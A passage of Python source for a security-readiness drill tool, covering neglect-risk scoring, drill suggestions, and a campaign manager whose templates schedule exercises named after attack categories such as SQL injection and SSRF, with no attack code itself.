    def suggest_next_drills(
        self,
        risk_profiles: List[ComponentRiskProfile],
        n: int = 5,
        scenario_library: Optional["ScenarioLibrary"] = None,
    ) -> List[Dict[str, Any]]:
        """Return prioritized drill suggestions based on neglect risk.

        Args:
            risk_profiles: Output from predict_neglect_risk().
            n: Number of drill suggestions to return.
            scenario_library: Optional ScenarioLibrary for scenario pairing.

        Returns:
            List of suggestion dicts with component, scenario, priority, rationale.
        """
        lib = scenario_library or ScenarioLibrary()
        suggestions: List[Dict[str, Any]] = []

        for profile in risk_profiles[:n]:
            # Match scenario to risk level
            min_sev = "critical" if profile.risk_level in ("critical", "high") else "medium"
            try:
                scenario = lib.random_scenario(min_severity=min_sev)
            except ValueError:
                scenario = lib.random_scenario(min_severity="low")

            suggestions.append({
                "priority": len(suggestions) + 1,
                "component_id": profile.component_id,
                "component_name": profile.component_name,
                "neglect_risk_score": profile.neglect_risk_score,
                "risk_level": profile.risk_level,
                "suggested_scenario": scenario.name,
                "scenario_display_name": scenario.display_name,
                "scenario_severity": scenario.severity,
                "rationale": profile.recommendation,
                "days_since_last_drill": profile.days_since_last_drill,
                "estimated_days_to_critical": profile.estimated_days_until_critical,
            })

        return suggestions

    def get_neglect_zones(
        self,
        risk_profiles: List[ComponentRiskProfile],
        threshold: float = 7.0,
    ) -> List[ComponentRiskProfile]:
        """Return components that have crossed the neglect zone threshold.

        Args:
            risk_profiles: Output from predict_neglect_risk().
            threshold: Risk score above which a component is a neglect zone.

        Returns:
            List of ComponentRiskProfile with risk_score >= threshold.
        """
        return [p for p in risk_profiles if p.neglect_risk_score >= threshold]

    # ------------------------------------------------------------------
    # Helpers (private)
    # ------------------------------------------------------------------

    @staticmethod
    def _compute_days_since_drill(last_drill_date: Optional[str]) -> int:
        """Return days since the last drill, or 999 if never drilled."""
        if not last_drill_date:
            return 999
        try:
            last = datetime.fromisoformat(last_drill_date)
            if last.tzinfo is None:
                last = last.replace(tzinfo=timezone.utc)
            now = datetime.now(timezone.utc)
            return max(0, (now - last).days)
        except (ValueError, TypeError):
            return 999

    @staticmethod
    def _recency_to_score(days: int) -> float:
        """Convert days since last drill to neglect risk score (0-10)."""
        if days >= 365:
            return 10.0
        elif days >= 180:
            return 8.5
        elif days >= 90:
            return 6.5
        elif days >= 60:
            return 4.5
        elif days >= 30:
            return 2.5
        else:
            return 1.0

    def _score_to_risk_level(self, score: float) -> str:
        """Map numeric risk score to risk level string."""
        for threshold, level in self._RISK_LEVELS:
            if score >= threshold:
                return level
        return "low"

    def _project_days_to_critical(
        self, risk_score: float, risk_level: str, days_since: int
    ) -> Optional[int]:
        """Estimate days until component reaches critical neglect."""
        if risk_level == "critical":
            return 0
        decay = self._DECAY_RATE_PER_LEVEL.get(risk_level, 0.05)
        gap_to_critical = max(0.0, 8.0 - risk_score)
        if decay <= 0:
            return None
        return max(0, int(gap_to_critical / decay))

    @staticmethod
    def _build_recommendation(
        risk_level: str,
        days_since: int,
        perf_score: float,
        change_score: float,
        comp_name: str,
    ) -> str:
        """Build human-readable recommendation string."""
        urgency = {
            "critical": "IMMEDIATE",
            "high": "URGENT",
            "medium": "Schedule within 2 weeks",
            "low": "Include in next quarterly rotation",
        }.get(risk_level, "Review")

        reasons: List[str] = []
        if days_since >= 90:
            reasons.append(f"no drill in {days_since} days")
        if perf_score >= 6.0:
            reasons.append("historically low drill scores")
        if change_score >= 7.0:
            reasons.append("high change velocity increasing attack surface")

        reason_str = f" ({'; '.join(reasons)})" if reasons else ""
        return f"{urgency}: Schedule drill for '{comp_name}'{reason_str}."


# ---------------------------------------------------------------------------
# CHAOS CAMPAIGN MANAGER
# ---------------------------------------------------------------------------


@dataclass
class CampaignDrill:
    """A single drill entry within a chaos campaign."""

    drill_id: str
    scenario_name: str
    target_component: str
    scheduled_date: str
    status: str               # pending / active / completed / skipped
    score: Optional[float] = None
    grade: Optional[str] = None
    notes: str = ""


@dataclass
class Campaign:
    """A multi-drill chaos campaign."""

    campaign_id: str
    name: str
    description: str
    template: str
    org_id: str
    start_date: str
    end_date: str
    status: str                  # planning / active / completed / paused
    drills: List[CampaignDrill] = field(default_factory=list)
    created_at: str = ""
    completed_at: Optional[str] = None

    # Aggregate metrics (populated after drills complete)
    aggregate_score: float = 0.0
    score_trend: str = ""         # improving / declining / stable
    completion_rate: float = 0.0  # 0.0-1.0


class ChaosCampaignManager:
    """Multi-drill chaos campaign orchestration.

    Manages coordinated attack simulation campaigns spanning days or weeks.
    Provides templates for common security readiness scenarios, tracks
    progress, and generates trend analysis across the campaign lifecycle.

    Built-in campaign templates:
    - **week_of_fire**: Daily drills Mon–Fri, escalating severity
    - **quarterly_assessment**: 12-drill quarterly readiness assessment
    - **new_team_onboarding**: Graduated onboarding campaign for new teams
    - **red_team_simulation**: Advanced adversarial simulation (week-long)
    - **compliance_audit_prep**: Pre-audit readiness across all controls

    Usage::

        mgr = ChaosCampaignManager()
        campaign = mgr.create_campaign(
            template="week_of_fire",
            org_id="org-123",
            target_components=["auth-service", "payment-api"],
        )
        mgr.record_drill_result(campaign.campaign_id, drill_id, score=8.2)
        summary = mgr.get_campaign_summary(campaign.campaign_id)
    """

    # Campaign template definitions
    _TEMPLATES: Dict[str, Dict[str, Any]] = {
        "week_of_fire": {
            "name": "Week of Fire",
            "description": (
                "5 consecutive daily drills (Mon–Fri) with escalating severity. "
                "Designed to stress-test team readiness under sustained pressure."
            ),
            "duration_days": 5,
            "drill_count": 5,
            "severity_progression": ["medium", "medium", "high", "high", "critical"],
            "scenarios": [
                "ssrf", "sqli", "command_injection", "deserialization", "log4shell"
            ],
            "goal": "Measure team response under sustained daily threat pressure",
        },
        "quarterly_assessment": {
            "name": "Quarterly Security Assessment",
            "description": (
                "12-drill assessment spread over 13 weeks. Covers all major attack "
                "categories and provides a comprehensive readiness benchmark."
            ),
            "duration_days": 91,
            "drill_count": 12,
            "severity_progression": [
                "medium", "high", "medium", "critical", "high",
                "medium", "high", "critical", "medium", "high", "high", "critical"
            ],
            "scenarios": [
                "sqli", "ssrf", "log4shell", "api_key_leak", "s3_bucket_exposure",
                "xxe", "idor", "jwt_bypass", "k8s_escape", "supply_chain",
                "race_condition", "deserialization"
            ],
            "goal": "Comprehensive quarterly readiness assessment across all attack categories",
        },
        "new_team_onboarding": {
            "name": "New Team Onboarding",
            "description": (
                "Graduated 4-week onboarding campaign for teams new to FAIL Engine. "
                "Starts with low-severity drills and progressively increases complexity."
            ),
            "duration_days": 28,
            "drill_count": 8,
            "severity_progression": [
                "low", "low", "medium", "medium", "medium", "high", "high", "critical"
            ],
            "scenarios": [
                "path_traversal", "idor", "ssrf", "sqli",
                "jwt_bypass", "command_injection", "deserialization", "log4shell"
            ],
            "goal": "Build team familiarity with drill process and response procedures",
        },
        "red_team_simulation": {
            "name": "Red Team Simulation",
            "description": (
                "Advanced 7-day red team simulation with realistic attack chains. "
                "Each day targets a different layer: web, auth, cloud, supply chain."
            ),
            "duration_days": 7,
            "drill_count": 7,
            "severity_progression": [
                "high", "critical", "high", "critical", "high", "critical", "critical"
            ],
            "scenarios": [
                "ssrf", "log4shell", "jwt_bypass", "k8s_escape",
                "supply_chain", "dependency_confusion", "deserialization"
            ],
            "goal": "Simulate realistic multi-stage attack chain across infrastructure layers",
        },
        "compliance_audit_prep": {
            "name": "Compliance Audit Prep",
            "description": (
                "10-drill campaign targeting controls assessed during SOC2/FedRAMP audits. "
                "Ensures evidence is available for each key control area."
            ),
            "duration_days": 30,
            "drill_count": 10,
            "severity_progression": [
                "high", "medium", "high", "medium", "critical",
                "medium", "high", "medium", "high", "critical"
            ],
            "scenarios": [
                "api_key_leak", "s3_bucket_exposure", "sqli", "idor", "jwt_bypass",
                "xxe", "path_traversal", "command_injection", "ssrf", "log4shell"
            ],
            "goal": "Generate audit-ready evidence for compliance control coverage",
        },
    }

    def __init__(self) -> None:
        self._campaigns: Dict[str, Campaign] = {}
        self._scenario_library = ScenarioLibrary()

    # ------------------------------------------------------------------
    # Campaign lifecycle
    # ------------------------------------------------------------------

    def create_campaign(
        self,
        template: str,
        org_id: str,
        target_components: List[str],
        start_date: Optional[str] = None,
        custom_name: Optional[str] = None,
    ) -> Campaign:
        """Create a new chaos campaign from a template.

        Args:
            template: Template name (see _TEMPLATES keys).
            org_id: Organization ID.
            target_components: Components to include in the campaign.
            start_date: ISO start date (defaults to today).
            custom_name: Override template name.

        Returns:
            Campaign instance ready for execution.

        Raises:
            ValueError: If template name is not recognized.
        """
        if template not in self._TEMPLATES:
            available = ", ".join(self._TEMPLATES.keys())
            raise ValueError(f"Unknown template '{template}'. Available: {available}")

        tmpl = self._TEMPLATES[template]
        campaign_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc)

        start_dt = datetime.fromisoformat(start_date) if start_date else now
        if start_dt.tzinfo is None:
            start_dt = start_dt.replace(tzinfo=timezone.utc)

        duration = tmpl["duration_days"]
        end_dt = start_dt + timedelta(days=duration)
        drill_count = tmpl["drill_count"]

        # Distribute drills evenly across the campaign duration
        drill_interval = duration / drill_count
        scenarios = tmpl["scenarios"]
        severity_progression = tmpl["severity_progression"]

        # Cycle components across drills
        drills: List[CampaignDrill] = []
        for i in range(drill_count):
            scheduled_dt = start_dt + timedelta(days=i * drill_interval)
            component = target_components[i % len(target_components)]
            scenario = scenarios[i % len(scenarios)]
            drills.append(CampaignDrill(
                drill_id=str(uuid.uuid4()),
                scenario_name=scenario,
                target_component=component,
                scheduled_date=scheduled_dt.isoformat(),
                status="pending",
            ))

        campaign = Campaign(
            campaign_id=campaign_id,
            name=custom_name or tmpl["name"],
            description=tmpl["description"],
            template=template,
            org_id=org_id,
            start_date=start_dt.isoformat(),
            end_date=end_dt.isoformat(),
            status="planning",
            drills=drills,
            created_at=now.isoformat(),
        )

        self._campaigns[campaign_id] = campaign
        logger.info(
            "Created campaign %s (template=%s, drills=%d)",
            campaign_id, template, drill_count
        )
        return campaign

    def start_campaign(self, campaign_id: str) -> Campaign:
        """Transition campaign from 'planning' to 'active'.

        Args:
            campaign_id: Campaign identifier.

        Raises:
            KeyError: If campaign not found.
            ValueError: If campaign is not in 'planning' status.
        """
        campaign = self._get_campaign(campaign_id)
        if campaign.status != "planning":
            raise ValueError(
                f"Campaign {campaign_id} is in '{campaign.status}' status; "
                "can only start from 'planning'"
            )
        campaign.status = "active"
        logger.info("Started campaign %s", campaign_id)
        return campaign

    def record_drill_result(
        self,
        campaign_id: str,
        drill_id: str,
        score: float,
        grade: Optional[str] = None,
        notes: str = "",
    ) -> Campaign:
        """Record the result of a completed drill within a campaign.

        Args:
            campaign_id: Campaign identifier.
            drill_id: Drill identifier within the campaign.
            score: Numeric score (0-10).
            grade: Optional letter grade.
            notes: Optional notes.

        Returns:
            Updated Campaign with recalculated aggregate metrics.
        """
        campaign = self._get_campaign(campaign_id)
        target_drill = next(
            (d for d in campaign.drills if d.drill_id == drill_id), None
        )
        if target_drill is None:
            raise KeyError(
                f"Drill '{drill_id}' not found in campaign '{campaign_id}'"
            )

        target_drill.status = "completed"
        target_drill.score = round(float(score), 2)
        target_drill.grade = grade or self._score_to_grade(score)
        target_drill.notes = notes

        # Recalculate aggregate metrics
        self._recalculate_aggregates(campaign)
        logger.info(
            "Recorded drill result: campaign=%s, drill=%s, score=%.2f",
            campaign_id, drill_id, score
        )
        return campaign

    def get_campaign_summary(self, campaign_id: str) -> Dict[str, Any]:
        """Return a comprehensive campaign progress summary.

        Args:
            campaign_id: Campaign identifier.

        Returns:
            Dict with overall metrics, per-drill results, and trend analysis.
        """
        campaign = self._get_campaign(campaign_id)
        completed = [d for d in campaign.drills if d.status == "completed"]
        pending = [d for d in campaign.drills if d.status == "pending"]
        scores = [d.score for d in completed if d.score is not None]

        trend_data = self._compute_trend(scores)

        return {
            "campaign_id": campaign.campaign_id,
            "name": campaign.name,
            "template": campaign.template,
            "org_id": campaign.org_id,
            "status": campaign.status,
            "start_date": campaign.start_date,
            "end_date": campaign.end_date,
            "progress": {
                "total_drills": len(campaign.drills),
                "completed": len(completed),
                "pending": len(pending),
                "skipped": sum(1 for d in campaign.drills if d.status == "skipped"),
                "completion_rate": round(campaign.completion_rate, 3),
            },
            "scores": {
                "aggregate": round(campaign.aggregate_score, 2),
                "min": round(min(scores), 2) if scores else None,
                "max": round(max(scores), 2) if scores else None,
                "avg": round(statistics.mean(scores), 2) if scores else None,
                "std_dev": round(statistics.stdev(scores), 2) if len(scores) >= 2 else None,
            },
            "trend": trend_data,
            "drills": [
                {
                    "drill_id": d.drill_id,
                    "scenario": d.scenario_name,
                    "component": d.target_component,
                    "scheduled_date": d.scheduled_date,
                    "status": d.status,
                    "score": d.score,
                    "grade": d.grade,
                }
                for d in campaign.drills
            ],
        }

    def list_campaigns(
        self,
        org_id: Optional[str] = None,
        status: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """List campaigns, optionally filtered by org and status.

        Args:
            org_id: Filter by organization ID.
            status: Filter by campaign status.

        Returns:
            List of campaign summary dicts.
        """
        campaigns = list(self._campaigns.values())
        if org_id:
            campaigns = [c for c in campaigns if c.org_id == org_id]
        if status:
            campaigns = [c for c in campaigns if c.status == status]
        return [self.get_campaign_summary(c.campaign_id) for c in campaigns]

    def get_available_templates(self) -> List[Dict[str, Any]]:
        """Return all available campaign templates with metadata.

        Returns:
            List of template summary dicts.
        """
        return [
            {
                "template_id": k,
                "name": v["name"],
                "description": v["description"],
                "duration_days": v["duration_days"],
                "drill_count": v["drill_count"],
                "goal": v["goal"],
            }
            for k, v in self._TEMPLATES.items()
        ]

    def pause_campaign(self, campaign_id: str) -> Campaign:
        """Pause an active campaign.

        Args:
            campaign_id: Campaign identifier.

        Returns:
            Updated Campaign with 'paused' status.
        """
        campaign = self._get_campaign(campaign_id)
        if campaign.status != "active":
            raise ValueError(f"Campaign '{campaign_id}' is not active")
        campaign.status = "paused"
        return campaign

    def resume_campaign(self, campaign_id: str) -> Campaign:
        """Resume a paused campaign.

        Args:
            campaign_id: Campaign identifier.

        Returns:
            Updated Campaign with 'active' status.
        """
        campaign = self._get_campaign(campaign_id)
        if campaign.status != "paused":
            raise ValueError(f"Campaign '{campaign_id}' is not paused")
        campaign.status = "active"
        return campaign

    def complete_campaign(self, campaign_id: str) -> Campaign:
        """Mark a campaign as completed.

        Args:
            campaign_id: Campaign identifier.

        Returns:
            Updated Campaign with 'completed' status.
        """
        campaign = self._get_campaign(campaign_id)
        campaign.status = "completed"
        campaign.completed_at = datetime.now(timezone.utc).isoformat()
        self._recalculate_aggregates(campaign)
        return campaign

    # ------------------------------------------------------------------
    # Helpers (private)
    # ------------------------------------------------------------------

    def _get_campaign(self, campaign_id: str) -> Campaign:
        """Retrieve a campaign or raise KeyError."""
        if campaign_id not in self._campaigns:
            raise KeyError(f"Campaign '{campaign_id}' not found")
        return self._campaigns[campaign_id]

    def _recalculate_aggregates(self, campaign: Campaign) -> None:
        """Recalculate aggregate_score, completion_rate, score_trend in place."""
        completed = [d for d in campaign.drills if d.status == "completed"]
        scores = [d.score for d in completed if d.score is not None]
        total = len(campaign.drills)

        campaign.completion_rate = len(completed) / total if total > 0 else 0.0
        campaign.aggregate_score = statistics.mean(scores) if scores else 0.0
        campaign.score_trend = self._compute_trend(scores).get("direction", "stable")

    def _compute_trend(self, scores: List[float]) -> Dict[str, Any]:
        """Compute trend direction and slope from score sequence."""
        if len(scores) < 2:
            return {"direction": "stable", "slope": 0.0, "data_points": len(scores)}

        n = len(scores)
        x_mean = (n - 1) / 2.0
        y_mean = statistics.mean(scores)
        numerator = sum((i - x_mean) * (scores[i] - y_mean) for i in range(n))
        denominator = sum((i - x_mean) ** 2 for i in range(n))
        slope = numerator / denominator if denominator != 0 else 0.0

        if slope > 0.1:
            direction = "improving"
        elif slope < -0.1:
            direction = "declining"
        else:
            direction = "stable"

        return {
            "direction": direction,
            "slope": round(slope, 4),
            "data_points": n,
            "first_score": scores[0],
            "last_score": scores[-1],
            "delta": round(scores[-1] - scores[0], 2),
        }

    @staticmethod
    def _score_to_grade(score: float) -> str:
        """Convert numeric score to letter grade."""
        if score >= 9.5:
            return "A+"
        elif score >= 9.0:
            return "A"
        elif score >= 8.0:
            return "B+"
        elif score >= 7.0:
            return "B"
        elif score >= 6.0:
            return "C+"
        elif score >= 5.0:
            return "C"
        elif score >= 4.0:
            return "D"
        return "F"


# ---------------------------------------------------------------------------
# Module-level singleton helpers
# ---------------------------------------------------------------------------

_scenario_library_instance: Optional[ScenarioLibrary] = None
_auto_grader_instance: Optional[AutoGrader] = None
_neglect_predictor_instance: Optional[NeglectZonePredictor] = None
_campaign_manager_instance: Optional[ChaosCampaignManager] = None


def get_scenario_library() -> ScenarioLibrary:
    """Return the module-level ScenarioLibrary singleton."""
    global _scenario_library_instance
    if _scenario_library_instance is None:
        _scenario_library_instance = ScenarioLibrary()
    return _scenario_library_instance


def get_auto_grader() -> AutoGrader:
    """Return the module-level AutoGrader singleton."""
    global _auto_grader_instance
    if _auto_grader_instance is None:
        _auto_grader_instance = AutoGrader()
    return _auto_grader_instance


def get_neglect_predictor() -> NeglectZonePredictor:
    """Return the module-level NeglectZonePredictor singleton."""
    global _neglect_predictor_instance
    if _neglect_predictor_instance is None:
        _neglect_predictor_instance = NeglectZonePredictor()
    return _neglect_predictor_instance


def get_campaign_manager() -> ChaosCampaignManager:
    """Return the module-level ChaosCampaignManager singleton."""
    global _campaign_manager_instance
    if _campaign_manager_instance is None:
        _campaign_manager_instance = ChaosCampaignManager()
    return _campaign_manager_instance

